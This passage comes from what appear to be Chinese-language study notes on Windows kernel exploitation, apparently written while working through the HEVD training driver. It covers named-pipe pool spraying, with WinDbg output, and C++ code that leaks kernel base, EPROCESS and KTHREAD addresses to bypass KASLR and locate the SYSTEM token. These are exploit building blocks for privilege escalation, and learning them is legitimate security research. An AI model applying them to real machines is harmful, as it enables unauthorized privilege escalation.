</span></span><span style="display:flex;"><span>PS&gt; bcdedit /debug on
</span></span></code></pre></div><h4 id="devices--symlinks">Devices &amp; Symlinks</h4>
<p><strong>Devices are interfaces that let processes interact with the driver</strong> while <strong>Symlink is an alias you can use while calling Win32 functions</strong>.</p>
<ul>
<li><code>IoCreateDevice</code> creates DeviceNames: <code>\Device\VulnerableDevice</code></li>
<li><code>IoCreateSymbolicLink</code> creates Symlinks: <code>\\.\VulnerableDevice</code></li>
</ul>
<p>设备的名称：</p>
<ul>
<li>设备命名后，其它内核模式部件可以通过调用IoGetDeviceObjectPointer函数找到该设备，找到设备对象后，就可以向该设备的驱动程序发送IRP。</li>
<li>允许应用程序打开命名设备的句柄，这样它们就可以向驱动程序发送IRP。</li>
</ul>
<p><strong>符号链接名：</strong> 驱动程序为设备创建符号链接，应用程序可以使用符号链接名称来访问设备</p>
<ul>
<li>设备是可以没有名字的，但是得存在符号链接用户态才能访问设备</li>
</ul>
<p>我们可以使用 Sysinternals Suite 里的 <code>winobj.exe</code> 来查看。</p>
<ul>
<li>global 搜索 symlink 就可以找到device</li>
</ul>
<h4 id="dispatch-routines">Dispatch Routines</h4>
<p>派遣函数 MajorFunction</p>
<h3 id="windows-kernel-heapfengshui">Windows Kernel HeapFengshui</h3>
<p><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Windows HeapFengShui</a></p>
<p>这篇文章主要介绍了内核态的heap spraying，在HEVD UAF时看过，再看几遍</p>
<p>首先Windows内核提权手段</p>
<ul>
<li>修改权限相关的数据结构</li>
<li>内核态ROP</li>
</ul>
<p>Pool</p>
<ul>
<li>regular pool: 少于一个内存页大小的分配，X64下小于4064字节（16字节用于池头部，16字节分给初始的空闲块）</li>
<li>big pool: 大于于一个内存页大小的分配，没有预留头部空间，内存页是通过<code>nt!PoolBigPageTable</code>来索引跟踪的</li>
</ul>
<p>heap spray: Socket和 NamedPipe</p>
<ul>
<li>创建一个本地Socket套接字并监听，用另外一个线程连接该套接字，然后发出一个写操作（写的数据要超过4K），但不要读。</li>
<li>创建一个命名管道，然后发出一个写操作（同样数据大于4K），且不要读。这也将导致命名管道文件系统（NPFS.SYS）为管道数据分配一块非分页的内存块。</li>
<li>原因是因为 网络栈函数/NPFS缓冲区 操作位于DISPATCH_LEVEL(IRQL 2)层，是NonPagedPool。</li>
</ul>
<p>named pipe 比较简单，只需要几行代码就能搞定。但是NPFS会在我们自己的缓冲区前面加上一个包含其自身内联头部的前缀，该前缀被称为<code>DATA_QUEUE_ENTRY</code>。NPFS头部的大小会随版本不同而略有差异</p>
<p><a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">Windows Kernel Exploitation</a>文章里使用这个技术，NPFS NpFr：</p>
<ul>
<li>调用 <code>CreatePipe</code> 创建readPipe和writePipe</li>
<li>然后WriteFile往writePipe里写入内容</li>
<li>存在一个0x48大小的BUFFER_HEADER，后面跟着数据，NonPagedPool</li>
</ul>
<p>通过tag寻找pool，这个命令很长时间才能出结果。如果想知道pool大小，可以使用<code>!poolused</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>!poolfind TagString [PoolType]
</span></span></code></pre></div><p>调试一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;windows.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;iostream&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	HANDLE readPipe;
</span></span><span style="display:flex;"><span>	HANDLE writePipe;
</span></span><span style="display:flex;"><span>	BOOL res;
</span></span><span style="display:flex;"><span>	CHAR payload[<span style="color:#bd93f9">0x30</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	RtlFillMemory(payload, <span style="color:#ff79c6">sizeof</span>(payload), <span style="color:#bd93f9">0x43</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	res <span style="color:#ff79c6">=</span> CreatePipe(<span style="color:#ff79c6">&amp;</span>readPipe, <span style="color:#ff79c6">&amp;</span>writePipe, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#ff79c6">sizeof</span>(payload));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>res)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		std<span style="color:#ff79c6">::</span>cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[-] Error CreatePipe&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>endl;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	WriteFile(writePipe, payload, <span style="color:#ff79c6">sizeof</span>(payload), <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	std<span style="color:#ff79c6">::</span>cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;read: &#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> readPipe <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;write: &#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> writePipe <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	DebugBreak();
</span></span><span style="display:flex;"><span>	CloseHandle(readPipe);
</span></span><span style="display:flex;"><span>	CloseHandle(writePipe);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> EXIT_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>两个handle，查看其中一个Handle信息。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !handle 0xA4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PROCESS ffff9a8824cbd080
</span></span><span style="display:flex;"><span>    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
</span></span><span style="display:flex;"><span>    DirBase: 001ad000  ObjectTable: ffffc98328c04040  HandleCount: 2813.
</span></span><span style="display:flex;"><span>    Image: System
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Kernel handle table at ffffc98328c04040 with 2813 entries in use
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>00a4: Object: ffff9a8826ffca20  GrantedAccess: 0012019f (Protected) (Inherit) (Audit) Entry: ffffc98328cb2290
</span></span><span style="display:flex;"><span>Object: ffff9a8826ffca20  Type: (ffff9a8824d1cae0) File
</span></span><span style="display:flex;"><span>    ObjectHeader: ffff9a8826ffc9f0 (new version)
</span></span><span style="display:flex;"><span>        HandleCount: 1  PointerCount: 32768
</span></span><span style="display:flex;"><span>        Directory Object: 00000000  Name: \Device\HarddiskVolume3\$Extend\$RmMetadata\$TxfLog\$TxfLog {clfs}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !pool ffff9a8826ffca20 2</span>
</span></span><span style="display:flex;"><span>Pool page ffff9a8826ffca20 region is Nonpaged pool
</span></span><span style="display:flex;"><span>*ffff9a8826ffc9a0 size:  190 previous size:    0  (Allocated) *File
</span></span><span style="display:flex;"><span>		Pooltag File : File objects
</span></span></code></pre></div><p>可以看出来NonPaged多了一个0x70大小的内存区域。当我们我们写入0x28大小，也是0x70，存在对齐情况。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !poolused 1 NpFr</span>
</span></span><span style="display:flex;"><span>Using a machine size of 1ffe7f pages to configure the kd cache
</span></span><span style="display:flex;"><span>........
</span></span><span style="display:flex;"><span> Sorting by Tag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                            NonPaged                                         Paged
</span></span><span style="display:flex;"><span> Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> NpFr        2905        2904         1          112            0           0         0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TOTAL        2905        2904         1          112            0           0         0            0
</span></span></code></pre></div><p>多次写 0x30 大小</p>
<ul>
<li>写两次，就会是0xe0 =&gt; 0x70 * 2</li>
<li>3次，0x150 = 0x70 * 3</li>
</ul>
<p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/-poolfind">poolfind (WinDbg)</a>，在本机一个多小时还是出不了结果🤣</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !poolfind NpFr -nonpaged</span>
</span></span></code></pre></div><h3 id="ntquerysysteminformation">NtQuerySystemInformation</h3>
<p>文章中提到绕过 KASLR 的一个函数，这个函数可以在<code>ntdll.dll</code>中获取</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>__kernel_entry NTSTATUS <span style="color:#50fa7b">NtQuerySystemInformation</span>(
</span></span><span style="display:flex;"><span>  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
</span></span><span style="display:flex;"><span>  [in, out]       PVOID                    SystemInformation,
</span></span><span style="display:flex;"><span>  [in]            ULONG                    SystemInformationLength,
</span></span><span style="display:flex;"><span>  [out, optional] PULONG                   ReturnLength
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>但是Windows可能会限制用户模式下对系统信息的访问权限，包括对<code>NtQuerySystemInformation</code>函数的调用</p>
<p>有个不错的仓库：<a href="https://github.com/sam-b/windows_kernel_address_leaks">windows_kernel_address_leaks</a></p>
<h4 id="systemmoduleinformation">SystemModuleInformation</h4>
<p>故名思意，查询模块的基地址</p>
<p>from: <a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/">HEVD Exploits</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>INT64 <span style="color:#50fa7b">get_kernel_base</span>() 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[&gt;] Getting kernel base address...&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">//also using the same import technique that @tekwizz123 showed us
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    PNtQuerySystemInformation NtQuerySystemInformation <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA(<span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;NtQuerySystemInformation&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>NtQuerySystemInformation) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[!] Failed to get the address of NtQuerySystemInformation.&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[!] Last error &#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> GetLastError() <span style="color:#ff79c6">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ULONG len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    NtQuerySystemInformation(SystemModuleInformation,
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PSYSTEM_MODULE_INFORMATION pModuleInfo <span style="color:#ff79c6">=</span> (PSYSTEM_MODULE_INFORMATION)
</span></span><span style="display:flex;"><span>        VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>,
</span></span><span style="display:flex;"><span>            len,
</span></span><span style="display:flex;"><span>            MEM_RESERVE <span style="color:#ff79c6">|</span> MEM_COMMIT,
</span></span><span style="display:flex;"><span>            PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    NTSTATUS status <span style="color:#ff79c6">=</span> NtQuerySystemInformation(SystemModuleInformation,
</span></span><span style="display:flex;"><span>        pModuleInfo,
</span></span><span style="display:flex;"><span>        len,
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;</span>len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (status <span style="color:#ff79c6">!=</span> (NTSTATUS)<span style="color:#bd93f9">0x0</span>) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[!] NtQuerySystemInformation failed!&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PVOID kernelImageBase <span style="color:#ff79c6">=</span> pModuleInfo<span style="color:#ff79c6">-&gt;</span>Modules[<span style="color:#bd93f9">0</span>].ImageBaseAddress;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cout <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#f1fa8c">&#34;[&gt;] ntoskrnl.exe base address: 0x&#34;</span> <span style="color:#ff79c6">&lt;&lt;</span> hex <span style="color:#ff79c6">&lt;&lt;</span> kernelImageBase <span style="color:#ff79c6">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> (INT64)kernelImageBase;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>我们可以通过其Name查询指定模块基址 <code>SYSTEM_MODULE_INFORMATION-&gt;Modules[ModulesCount].Name</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">SYSTEM_MODULE</span> {
</span></span><span style="display:flex;"><span>	ULONG                Reserved1;
</span></span><span style="display:flex;"><span>	ULONG                Reserved2;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#ifdef _WIN64
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>	ULONG				Reserved3;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>	PVOID                ImageBaseAddress;
</span></span><span style="display:flex;"><span>	ULONG                ImageSize;
</span></span><span style="display:flex;"><span>	ULONG                Flags;
</span></span><span style="display:flex;"><span>	WORD                 Id;
</span></span><span style="display:flex;"><span>	WORD                 Rank;
</span></span><span style="display:flex;"><span>	WORD                 w018;
</span></span><span style="display:flex;"><span>	WORD                 NameOffset;
</span></span><span style="display:flex;"><span>	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
</span></span><span style="display:flex;"><span>}SYSTEM_MODULE, <span style="color:#ff79c6">*</span>PSYSTEM_MODULE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">SYSTEM_MODULE_INFORMATION</span> {
</span></span><span style="display:flex;"><span>	ULONG                ModulesCount;
</span></span><span style="display:flex;"><span>	SYSTEM_MODULE        Modules[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>} SYSTEM_MODULE_INFORMATION, <span style="color:#ff79c6">*</span>PSYSTEM_MODULE_INFORMATION;
</span></span></code></pre></div><h4 id="systemextendedhandleinformation">SystemExtendedHandleInformation</h4>
<p>通过其指定的handle(<code>SYSTEM_HANDLE_INFORMATION_EX-&gt;Handles[HandleCount].UniqueProcessId</code>)查询Object</p>
<p>Handle</p>
<ul>
<li>Process的Handle，EPROCESS</li>
<li>Thread的Handle, ETHREAD</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_HANDLE</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	PVOID Object;
</span></span><span style="display:flex;"><span>	HANDLE UniqueProcessId;
</span></span><span style="display:flex;"><span>	HANDLE HandleValue;
</span></span><span style="display:flex;"><span>	ULONG GrantedAccess;
</span></span><span style="display:flex;"><span>	USHORT CreatorBackTraceIndex;
</span></span><span style="display:flex;"><span>	USHORT ObjectTypeIndex;
</span></span><span style="display:flex;"><span>	ULONG HandleAttributes;
</span></span><span style="display:flex;"><span>	ULONG Reserved;
</span></span><span style="display:flex;"><span>} SYSTEM_HANDLE, <span style="color:#ff79c6">*</span>PSYSTEM_HANDLE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_SYSTEM_HANDLE_INFORMATION_EX</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	ULONG_PTR HandleCount;
</span></span><span style="display:flex;"><span>	ULONG_PTR Reserved;
</span></span><span style="display:flex;"><span>	SYSTEM_HANDLE Handles[<span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>} SYSTEM_HANDLE_INFORMATION_EX, <span style="color:#ff79c6">*</span>PSYSTEM_HANDLE_INFORMATION_EX;
</span></span></code></pre></div><p>查询pid为4，HandleValue为4, object代表SYSTEM进程EPROCESS的地址，从而可以获得token的地址</p>
<p>ETHREAD(KTHREAD) 的地址：当HandleValue为当前指定的Thread</p>
<ul>
<li>Thread可以OpenThread指定</li>
<li>还可以在Process中CreateThread</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HANDLE hThread <span style="color:#ff79c6">=</span> OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> z <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> system_handle_info<span style="color:#ff79c6">-&gt;</span>NumberOfHandles; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ((HANDLE)system_handle_info<span style="color:#ff79c6">-&gt;</span>Handles[i].HandleValue <span style="color:#ff79c6">==</span> hThread)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (system_handle_info<span style="color:#ff79c6">-&gt;</span>Handles[i].ObjectTypeIndex <span style="color:#ff79c6">==</span> ObjectThreadType)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			z<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> array_size <span style="color:#ff79c6">=</span> z <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>PVOID<span style="color:#ff79c6">*</span> kThread_array <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> PVOID[array_size];
</span></span><span style="display:flex;"><span>z <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> system_handle_info<span style="color:#ff79c6">-&gt;</span>NumberOfHandles; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ((HANDLE)system_handle_info<span style="color:#ff79c6">-&gt;</span>Handles[i].HandleValue <span style="color:#ff79c6">==</span> hThread)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (system_handle_info<span style="color:#ff79c6">-&gt;</span>Handles[i].ObjectTypeIndex <span style="color:#ff79c6">==</span> ObjectThreadType)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			kThread_array[z] <span style="color:#ff79c6">=</span> system_handle_info<span style="color:#ff79c6">-&gt;</span>Handles[i].Object;
</span></span><span style="display:flex;"><span>			z<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printf(<span style="color:#f1fa8c">&#34;[+] KTHREAD address: %p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kThread_array[array_size]);
</span></span></code></pre></div><h3 id="scoop-the-windows-10-pool">Scoop the Windows 10 pool!</h3>
<p>内核池</p>
<p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1</a></p>
<p><a href="https://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/">Scoop The Windows 10 Pool 翻译</a></p>
<p><a href="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Windows10内核池管理机制与利用方法 | Ash blog (ashlq.github.io)</a></p>
<p>比较新的一篇总结：<a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D%2FD0Dx2DUEFxciD9WGrGYD">Windows内核利用小总结</a></p>
<h4 id="pool">pool</h4>
<p>用户态操作在 <code>C\Windows\system32\ntdll.dll</code> 中，可以逆向看看。</p>
<p>在win10 2004（这一版本也被称为Win10 2020年五月更新版（代号是20H1）） 以及之前是</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>PVOID <span style="color:#50fa7b">ExAllocatePoolWithTag</span>(
</span></span><span style="display:flex;"><span>  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
</span></span><span style="display:flex;"><span>  [in] SIZE_T                                         NumberOfBytes,
</span></span><span style="display:flex;"><span>  [in] ULONG                                          Tag
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>在内核池中,所有<strong>单页的数据块的开头</strong>都是一个POOL_HEADER结构。这个结构包含了分配器和tag信息。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// win10 22h2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span> kd<span style="color:#ff79c6">&gt;</span> dt nt<span style="color:#ff79c6">!</span>_POOL_HEADER
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">PreviousSize</span>     : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">PoolIndex</span>        : Pos <span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x002</span> <span style="color:#8be9fd;font-style:italic">BlockSize</span>        : Pos <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x002</span> <span style="color:#8be9fd;font-style:italic">PoolType</span>         : Pos <span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">8</span> Bits
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x000</span> <span style="color:#8be9fd;font-style:italic">Ulong1</span>           : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x004</span> <span style="color:#8be9fd;font-style:italic">PoolTag</span>          : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">ProcessBilled</span>    : Ptr64 _EPROCESS
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x008</span> <span style="color:#8be9fd;font-style:italic">AllocatorBackTraceIndex</span> : Uint2B
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x00a</span> <span style="color:#8be9fd;font-style:italic">PoolTagHash</span>      : Uint2B
</span></span></code></pre></div><p>主要的PoolType:NonPagedPool,PagedPool,SessionPool,NonPagedPoolNx</p>
<ul>
<li>在win8中引入了NonPagedPoolNx,必须使用它来替代NonpagedPool类型.</li>
</ul>
<p><strong>PagedPool</strong>是分页内存，简单来说就是物理内存不够时，会把这片内存移动到硬盘上。</p>
<ul>
<li>一个物理地址能对应多个虚拟地址</li>
</ul>
<p>而<strong>NonPagedPool</strong>是无论物理内存如何紧缺，都绝对不把这片内存的内容移动到硬盘上。只能常驻于物理内存地址，不能映射</p>
<p>Segment Heap &ndash; 段堆自Windows 10 19H1开始用于内核空间，与用户空间中使用的段堆非常相似。就像在用户态使用的一样，段堆是为根据分配大小的不同提供不同的功能，为此来定义了多种不同类型的后端处理。</p>
<p>win10之后堆分为两种：Segment heap和NT heap。当一个进程分配堆的时候，大部分场合默认使用的堆都是后面那种，前面的segment heap通常会在winapp或者某些特殊的进程（核心进程）中会使用到。</p>
<p>这两种堆称为前端堆（Frontend Heap）和后端堆（Backend Heap）</p>
<p>低碎片堆(LFH)  &lt;= 0x200
